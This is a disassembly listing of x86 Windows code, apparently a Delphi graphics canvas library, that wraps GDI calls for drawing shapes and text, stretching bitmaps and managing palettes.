call sub_424068
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424cf8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_4188b0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_424424
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_41894c
xor edx edx
mov eax esi
call sub_424af0
mov eax [ esi + 0xc ]
call sub_403174
mov eax [ esi + 0x10 ]
call sub_403174
mov eax [ esi + 0x14 ]
call sub_403174
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b44
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_424480
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424b44
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_424508
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
mov eax [ ebx + 0x14 ]
call sub_424208
call sub_423584
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423584
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_416c50
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4245b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Ellipse
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4245fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
mov eax [ ebx + 0x14 ]
call sub_424244
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_424638
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
mov eax [ ebx + 0x14 ]
call sub_424244
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_424674
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4246d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_424700
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_424748
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call RoundRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_424798
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4247d4
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_424a70
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_424800
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
mov eax ebx
call sub_4247d4
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_4041ac
push eax
mov eax esi
call sub_4043ac
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_4248d0
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4246d4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_4248d0
inc eax
add edi eax
sub_42488c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4041ac
push eax
mov eax edi
call sub_4043ac
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_4248d0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_42488c
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4248ec
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_42488c
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_42490c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_424958
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42495f
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_4246ac
sub_4249b8
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_4249dc
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_4246d4
pop ecx
pop edx
pop edi
pop esi
retn
sub_4249fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_424a28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424b44
mov eax [ ebp + 0x8 ]
call sub_423584
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_424a90
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_424af0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_424a90
mov edx esp
mov eax ebx
call sub_4249b8
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_4249dc
sub_424b44
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_424be0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
test bl 0x8
je r-xdata
mov eax esi
call sub_424c0c
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_424c3c
sub_424be0
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_423a58
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423584
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_424c0c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_423f58
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_424c3c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_424244
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_424244
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_424324
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_424208
call sub_423584
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_424208
call sub_423584
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_424d60
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_424daa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424db1
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_424db4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_424e50
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_424d60
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_40415c
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e57
lea eax [ ebp - 0x104 ]
call sub_403eec
retn
sub_424e6c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_424fba
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_424f29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_424db4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_424db4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424fc1
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_424fcc
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_425000
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_424e5c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_425280
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424e5c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425287
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424e5c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4250d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406a90
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425287
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_425294
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_4252cc
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b80
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_425344
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_42539c
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028f0
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425499
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4254a0
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_4254b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42553a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_42554c
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028f0
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_425344
mov eax esp
call sub_4254b4
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_4255f0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_425344
